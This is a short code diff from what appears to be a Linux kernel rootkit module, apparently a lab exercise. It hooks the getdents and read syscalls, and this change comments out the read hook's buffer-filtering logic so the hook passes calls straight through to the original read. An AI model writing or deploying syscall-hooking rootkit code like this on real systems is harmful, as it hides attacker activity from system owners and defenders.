@@ -92,6 +92,7 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
 // ssize_t read(int fd, void *buf, size_t count);
 // DI, SI, DX
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
+    /*
     ssize_t nread = original_read(regs);
     void * buf = (void *)regs->si;
     char * find = NULL;
@@ -114,7 +115,8 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
         }
     }
     return nread;
-    //return (*original_read)(regs);
+     */
+    return (*original_read)(regs);
 }
 
 // The code that gets executed when the module is loaded
